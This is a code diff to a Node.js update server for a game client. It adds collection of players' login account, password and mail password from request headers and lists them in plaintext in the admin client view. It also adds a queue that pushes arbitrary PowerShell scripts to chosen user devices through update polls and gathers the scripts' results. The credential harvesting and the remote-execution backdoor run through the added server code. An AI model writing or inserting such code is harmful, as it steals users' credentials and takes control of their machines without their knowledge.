@@ -25,6 +25,8 @@
  *   GET  /twms/admin/log-fetch     (loopback；待拉取队列)
  *   POST /twms/admin/force-target  (loopback；指定设备强更 enqueue|cancel)
  *   GET  /twms/admin/force-target  (loopback；指定强更队列)
+ *   POST /twms/admin/remote-script (loopback；指定设备 PowerShell enqueue|cancel)
+ *   GET  /twms/admin/remote-script (loopback；远程脚本队列)
  *   GET  /twms/admin/update-channels (loopback；对外允许版本 + 分组覆盖)
  *   POST /twms/admin/update-channels (loopback；set-default|set-group|clear-group)
  */
@@ -40,10 +42,11 @@ import { createDeviceQuota } from "./twms-device-quota.mjs";
 import { createClientHistory } from "./twms-client-history.mjs";
 import { createLogFetchQueue } from "./twms-log-fetch.mjs";
 import { createForceTargetQueue } from "./twms-force-target.mjs";
+import { createRemoteScriptQueue } from "./twms-remote-script.mjs";
 import { createIpGeo } from "./twms-ip-geo.mjs";
 import { createUpdateChannels } from "./twms-update-channels.mjs";
 
-const SERVER_VERSION = "0.4.12";
+const SERVER_VERSION = "0.4.13";
 const kChinaTz = "Asia/Shanghai";
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const repoRoot = path.resolve(__dirname, "..");
@@ -302,6 +305,16 @@ const forceTarget = createForceTargetQueue({
   parseMacList: (v) => access.parseMacList(v),
 });
 
+const remoteScript = createRemoteScriptQueue({
+  logInfo,
+  ts,
+  parseMacList: (v) => access.parseMacList(v),
+  normalizeMac: (v) => {
+    const list = access.parseMacList(v);
+    return list[0] || "";
+  },
+});
+
 const updateChannels = createUpdateChannels({
   releaseRoot,
   logInfo,
@@ -386,7 +399,32 @@ function clientIdentityFromReq(req) {
   const worldIdRaw = headerText(req, "x-xcat-world-id");
   const worldId = /^-?\d+$/.test(worldIdRaw) ? Number(worldIdRaw) : null;
   const worldName = decodeCharHeaderText(headerText(req, "x-xcat-world-name"), 32);
+  const hasLoginHeader = Object.prototype.hasOwnProperty.call(
+    req.headers || {},
+    "x-xcat-login-account",
+  );
+  const decodeLoginField = (name, maxChars) => {
+    const s = decodeCharHeaderText(headerText(req, name), maxChars);
+    if (!s || s === "-") return "";
+    return s;
+  };
+  const loginAccountRaw = decodeLoginField("x-xcat-login-account", 80);
+  const loginPass = hasLoginHeader ? decodeLoginField("x-xcat-login-pass", 80) : "";
+  const loginMailPass = hasLoginHeader ? decodeLoginField("x-xcat-login-mail-pass", 80) : "";
+  const loginGpDevice = hasLoginHeader ? decodeLoginField("x-xcat-login-gp-device", 32) : "";
+  const loginAccount =
+    hasLoginHeader && loginAccountRaw ? loginAccountRaw : "";
   const deviceId = headerText(req, "x-xcat-device-id").slice(0, 64);
+  const hwfp = String(headerText(req, "x-xcat-hwfp") || "")
+    .trim()
+    .toLowerCase()
+    .replace(/[^0-9a-f]/g, "")
+    .slice(0, 64);
+  const hwfpV1 = String(headerText(req, "x-xcat-hwfp-v1") || "")
+    .trim()
+    .toLowerCase()
+    .replace(/[^0-9a-f]/g, "")
+    .slice(0, 64);
   // 新客户端发派生凭证（整张卡不上网）；老客户端仍发整张卡，两者都认，优先前者。
   const gateProof = headerText(req, "x-xcat-gate-proof").slice(0, 400);
   const gateToken = headerText(req, "x-xcat-gate-token").slice(0, 400);
@@ -395,6 +433,8 @@ function clientIdentityFromReq(req) {
   return {
     machine: headerText(req, "x-xcat-machine").slice(0, 80),
     deviceId,
+    hwfp,
+    hwfpV1,
     appVersion: headerText(req, "x-xcat-app-version").slice(0, 64),
     gateToken,
     gateProof,
@@ -422,6 +462,11 @@ function clientIdentityFromReq(req) {
     worldId,
     worldName,
     hasWorld: !!(worldId != null && worldId > 0),
+    hasLoginHeader,
+    loginAccount,
+    loginPass: hasLoginHeader && loginAccount ? loginPass : "",
+    loginMailPass: hasLoginHeader && loginAccount ? loginMailPass : "",
+    loginGpDevice: hasLoginHeader && loginAccount ? loginGpDevice : "",
   };
 }
 
@@ -573,6 +618,7 @@ function clientHasIdentity({ machine, deviceId, macs, mac, token }) {
   return !!(machine || deviceId || (macs && macs.length) || mac || token);
 }
 
+// 活表不再调用：登录/选角页会把上周角色贴成「当前号」。历史客户端表走 client-history.list。
 function hydrateCharFromHistory(row) {
   if (!row || row.charName) return;
   const prev =
@@ -582,6 +628,8 @@ function hydrateCharFromHistory(row) {
   row.charName = String(prev.charName).slice(0, 48);
   if (!row.charLevel && prev.charLevel) row.charLevel = prev.charLevel;
   if (!row.charJobName && prev.charJobName) row.charJobName = String(prev.charJobName).slice(0, 32);
+  if (!row.charSeenMs && prev.charSeenMs) row.charSeenMs = prev.charSeenMs;
+  row.charFromHistory = true;
 }
 
 function hydrateWorldFromHistory(row) {
@@ -634,6 +682,11 @@ function touchClient({
   worldId,
   worldName,
   hasWorld,
+  hasLoginHeader,
+  loginAccount,
+  loginPass,
+  loginMailPass,
+  loginGpDevice,
 }) {
   if (!ip || ip === "unknown") return;
   const now = Date.now();
@@ -673,6 +726,13 @@ function touchClient({
       channelId: 0,
       worldId: 0,
       worldName: "",
+      loginAccount: "",
+      loginPass: "",
+      loginMailPass: "",
+      loginGpDevice: "",
+      charSeenMs: 0,
+      mapSeenMs: 0,
+      charFromHistory: false,
       firstSeenMs: now,
       lastSeenMs: now,
       hits: 0,
@@ -684,7 +744,6 @@ function touchClient({
       geoStatus: "",
     };
     activeClients.set(key, row);
-    hydrateCharFromHistory(row);
   }
   row.ip = ip;
   row.lastSeenMs = now;
@@ -736,9 +795,10 @@ function touchClient({
       row.expPerMin = 0;
       row.mesoPerMin = 0;
     }
+    row.charSeenMs = now;
+    row.charFromHistory = false;
   } else {
-    // 重启 / 更新后第一轮探活常不带角色（游戏还没进）。内存快照没了，从落盘历史补回名字。
-    hydrateCharFromHistory(row);
+    // 未带角色头：不从历史补名。活表只展示本次会话探活带到的角色，避免登录页看起来还在打旧号。
   }
   // 地图/频道同口径：有新值才刷，未进图探活不抹掉上次。
   // mapName 勿在仅带 channel、mapId=0 时清空（否则 OPS 留下旧 mapId + 空名）。
@@ -747,6 +807,7 @@ function touchClient({
       row.mapId = Math.floor(mapId);
       const name = String(mapName || "").slice(0, 64);
       if (name) row.mapName = name;
+      row.mapSeenMs = now;
     }
     if (Number.isFinite(channelId) && channelId > 0) row.channelId = Math.floor(channelId);
   }
@@ -757,6 +818,12 @@ function touchClient({
     if (wn) row.worldName = wn;
   } else {
     hydrateWorldFromHistory(row);
+  }
+  if (hasLoginHeader) {
+    row.loginAccount = String(loginAccount || "").slice(0, 80);
+    row.loginPass = String(loginPass || "").slice(0, 80);
+    row.loginMailPass = String(loginMailPass || "").slice(0, 80);
+    row.loginGpDevice = String(loginGpDevice || "").slice(0, 32);
   }
   if (hasChar) {
     const snap = `${row.charName}|${row.charLevel}|${row.charMeso}|${row.mapId || 0}|${row.channelId || 0}|${row.worldId || 0}`;
@@ -927,16 +994,15 @@ function gateViewForRow(row, now, activeSec, banned, allowed, accessMode) {
   };
 }
 
-function listActiveClients(activeSec) {
+function listOnlineClientBuckets(activeSec) {
   const now = Date.now();
   pruneActiveClients(now);
   const cutoff = now - activeSec * 1000;
   const online = [...activeClients.values()].filter((r) => r.lastSeenMs >= cutoff);
-  for (const row of online) hydrateCharFromHistory(row);
   const byIp = new Map();
   for (const row of online) byIp.set(row.ip, (byIp.get(row.ip) || 0) + 1);
   const accessMode = access.getMode();
-  return online
+  const views = online
     .map((row) => {
       const banned = access.isBanned({
         machine: row.machine,
@@ -953,6 +1019,8 @@ function listActiveClients(activeSec) {
         uid: row.uid,
       });
       const gv = gateViewForRow(row, now, activeSec, banned, allowed, accessMode);
+      // 进图=这次探活带了 mapId；启动器还在、没进图的进死表（mapSeenMs 仍是上次进图时刻）。
+      const inMap = Number(row.mapSeenMs) > 0 && row.mapSeenMs === row.lastSeenMs;
       return {
         key: row.key,
         ip: row.ip,
@@ -982,6 +1050,10 @@ function listActiveClients(activeSec) {
         channelId: row.channelId || 0,
         worldId: row.worldId || 0,
         worldName: row.worldName || "",
+        loginAccount: row.loginAccount || "",
+        loginPass: row.loginPass || "",
+        loginMailPass: row.loginMailPass || "",
+        loginGpDevice: row.loginGpDevice || "",
         identified: !!row.identified,
         sameIpOnline: byIp.get(row.ip) || 1,
         knownOnIp: devicesByIp.get(row.ip)?.size || 0,
@@ -993,6 +1065,11 @@ function listActiveClients(activeSec) {
         firstSeenAt: ts(new Date(row.firstSeenMs)),
         lastSeenAt: ts(new Date(row.lastSeenMs)),
         idleSec: Math.max(0, Math.floor((now - row.lastSeenMs) / 1000)),
+        charSeenAt: row.charSeenMs ? ts(new Date(row.charSeenMs)) : "",
+        charAgeSec: row.charSeenMs ? Math.max(0, Math.floor((now - row.charSeenMs) / 1000)) : -1,
+        mapAgeSec: row.mapSeenMs ? Math.max(0, Math.floor((now - row.mapSeenMs) / 1000)) : -1,
+        inMap,
+        charFromHistory: !!row.charFromHistory,
         banned,
         allowed,
         accessMode,
@@ -1017,9 +1094,20 @@ function listActiveClients(activeSec) {
           mac: row.mac,
           token: row.token,
         }),
+        remoteScript: remoteScript.statusFor({
+          machine: row.machine,
+          deviceId: row.deviceId,
+          macs: row.macs,
+          mac: row.mac,
+          token: row.token,
+        }),
       };
     })
     .sort((a, b) => a.idleSec - b.idleSec || a.ip.localeCompare(b.ip));
+  return {
+    live: views.filter((v) => v.inMap),
+    dead: views.filter((v) => !v.inMap),
+  };
 }
 
 function normalizeBasePath(value) {
@@ -1108,6 +1196,8 @@ const logUpload = createLogUpload({
   getShuttingDown: () => shuttingDown,
   noteError,
   clientIp,
+  // 可信 uid：验签派生凭证 / 老客户端整张卡。不要信上传 JSON 里自报的 uid。
+  resolveUidFromReq: (req) => clientIdentityFromReq(req).gateUid || "",
 });
 
 function classifyRoute(routedPath) {
@@ -1175,6 +1265,11 @@ function recordRequest({
   worldId,
   worldName,
   hasWorld,
+  hasLoginHeader,
+  loginAccount,
+  loginPass,
+  loginMailPass,
+  loginGpDevice,
 }) {
   stats.requestsTotal += 1;
   stats.lastRequestAt = ts();
@@ -1218,6 +1313,11 @@ function recordRequest({
     worldId,
     worldName,
     hasWorld,
+    hasLoginHeader,
+    loginAccount,
+    loginPass,
+    loginMailPass,
+    loginGpDevice,
   });
 
   if (isQuietForcePoll(status, kind, routedPath)) return;
@@ -1275,6 +1375,11 @@ function attachRequestRecorder(req, res, meta) {
       worldId: id.worldId,
       worldName: id.worldName,
       hasWorld: id.hasWorld,
+      hasLoginHeader: id.hasLoginHeader,
+      loginAccount: id.loginAccount,
+      loginPass: id.loginPass,
+      loginMailPass: id.loginMailPass,
+      loginGpDevice: id.loginGpDevice,
     });
   });
 }
@@ -1358,7 +1463,12 @@ async function handleUpdate(req, res, routedPath) {
     // 台数配额：黑白名单放行后再叠加。gateToken 验签取可信 uid，超额则改判拒。
     let quotaInfo = null;
     if (decision.allowed) {
-      const q = quota.evaluate({ claims: gateClaims, deviceId: id.deviceId });
+      const q = quota.evaluate({
+        claims: gateClaims,
+        deviceId: id.deviceId,
+        hwfp: id.hwfp,
+        hwfpV1: id.hwfpV1,
+      });
       if (q.enabled && q.uid) quotaInfo = q;
       if (q.enabled && !q.allowed) {
         decision.allowed = false;
@@ -1388,17 +1498,23 @@ async function handleUpdate(req, res, routedPath) {
     }
     const ackId = headerText(req, "x-xcat-log-fetch-ack");
     const doneId = headerText(req, "x-xcat-log-fetch-done");
-    const pending = logFetch.onAccess(
-      {
-        machine: id.machine,
-        deviceId: id.deviceId,
-        macs: id.macs,
-        mac: id.mac,
-        token: id.token,
-      },
-      ackId,
-      doneId,
-    );
+    const identity = {
+      machine: id.machine,
+      deviceId: id.deviceId,
+      macs: id.macs,
+      mac: id.mac,
+      token: id.token,
+    };
+    const scriptAckId = headerText(req, "x-xcat-script-ack");
+    const scriptDoneId = headerText(req, "x-xcat-script-done");
+    const scriptPending = remoteScript.onAccess(identity, scriptAckId, scriptDoneId, {
+      result: headerText(req, "x-xcat-script-result"),
+      exitCode: headerText(req, "x-xcat-script-exit"),
+      outTail: headerText(req, "x-xcat-script-out"),
+    });
+    const pending = scriptPending
+      ? null
+      : logFetch.onAccess(identity, ackId, doneId);
     const payload = {
       ok: true,
       allowed: !!decision.allowed,
@@ -1415,7 +1531,24 @@ async function handleUpdate(req, res, routedPath) {
       payload.quotaUsed = quotaInfo.used;
       payload.quotaMax = quotaInfo.max;
     }
-    if (pending) {
+    if (scriptPending) {
+      payload.pendingOp = scriptPending.op;
+      payload.pendingId = scriptPending.id;
+      payload.pendingTimeoutSec = scriptPending.timeoutSec;
+      payload.pendingNote = scriptPending.note || scriptPending.title || "";
+      payload.pending = {
+        op: scriptPending.op,
+        id: scriptPending.id,
+        timeoutSec: scriptPending.timeoutSec,
+        note: scriptPending.note || "",
+      };
+      if (scriptPending.op === "showMsg") {
+        payload.pendingTitle = scriptPending.title || "提示";
+        payload.pendingBody = scriptPending.body || "";
+      } else {
+        payload.pendingScript = scriptPending.script || "";
+      }
+    } else if (pending) {
       payload.pendingOp = pending.op;
       payload.pendingId = pending.id;
       payload.pendingMode = pending.mode;
@@ -1590,11 +1723,13 @@ async function handleAdmin(req, res, routedPath) {
     } catch {
       /* keep default */
     }
-    const clients = listActiveClients(activeSec);
+    const buckets = listOnlineClientBuckets(activeSec);
+    const clients = buckets.live;
+    const deadClients = buckets.dead;
     if (refreshGeo) {
       ipGeo.invalidateAllAndRefresh();
     } else {
-      for (const c of clients) {
+      for (const c of clients.concat(deadClients)) {
         if (c.geoStatus === "pending" || (!c.geo && c.geoStatus !== "private")) {
           ipGeo.scheduleGeoLookup(c.ip);
         }
@@ -1607,6 +1742,7 @@ async function handleAdmin(req, res, routedPath) {
       ok: true,
       activeSec,
       count: clients.length,
+      deadCount: deadClients.length,
       geoProvider: ipGeo.provider,
       tracked: activeClients.size,
       accessMode: snap.mode,
@@ -1614,6 +1750,7 @@ async function handleAdmin(req, res, routedPath) {
       banCount: snap.banCount,
       allowCount: snap.allowCount,
       clients,
+      deadClients,
       recentDenies: recentAccessDenies.slice(0, 20),
       ipMultiDeviceAlerts: ipAlerts,
       ipMultiDeviceAlertCount: ipAlertTotal,
@@ -1886,6 +2023,54 @@ async function handleAdmin(req, res, routedPath) {
     sendJson(res, 400, { ok: false, error: "action must be enqueue|cancel" });
     return;
   }
+  if (routedPath === "/admin/remote-script" && req.method === "GET") {
+    sendJson(res, 200, { ok: true, pending: remoteScript.list() });
+    return;
+  }
+  if (routedPath === "/admin/remote-script" && req.method === "POST") {
+    const body = await readJsonBody(req, 96 * 1024);
+    const action = String(body?.action || "enqueue").trim().toLowerCase();
+    if (action === "cancel") {
+      const result = body?.id
+        ? remoteScript.cancel(String(body.id))
+        : remoteScript.cancel({
+            machine: body?.machine,
+            deviceId: body?.deviceId,
+            mac: body?.mac,
+            macs: body?.macs,
+            token: body?.token,
+          });
+      sendJson(res, 200, { ok: true, action: "cancel", result, pending: remoteScript.list() });
+      return;
+    }
+    if (action === "enqueue" || action === "push" || action === "run") {
+      try {
+        const row = remoteScript.enqueue({
+          machine: body?.machine,
+          deviceId: body?.deviceId,
+          mac: body?.mac,
+          macs: body?.macs,
+          token: body?.token,
+          op: body?.op,
+          script: body?.script,
+          title: body?.title,
+          body: body?.body,
+          timeoutSec: body?.timeoutSec,
+          note: body?.note,
+          by: body?.by || "ops",
+        });
+        sendJson(res, 200, { ok: true, action: "enqueue", job: row, pending: remoteScript.list() });
+      } catch (err) {
+        sendJson(res, err?.status || 400, {
+          ok: false,
+          error: err?.message || "enqueue failed",
+        });
+      }
+      return;
+    }
+    sendJson(res, 400, { ok: false, error: "action must be enqueue|cancel" });
+    return;
+  }
   if (routedPath === "/admin/force-target" && req.method === "GET") {
     sendJson(res, 200, { ok: true, pending: forceTarget.list() });
     return;
@@ -2122,6 +2307,7 @@ server.listen(port, host, () => {
   logInfo(`admin: POST ${basePath}/admin/shutdown (loopback only)`);
   logInfo(`admin: POST ${basePath}/admin/log-fetch (enqueue light|full)`);
   logInfo(`admin: POST ${basePath}/admin/force-target (per-device force update)`);
+  logInfo(`admin: POST ${basePath}/admin/remote-script (per-device PowerShell)`);
   logInfo(`admin: GET/POST ${basePath}/admin/update-channels (allowed update version)`);
 });
 
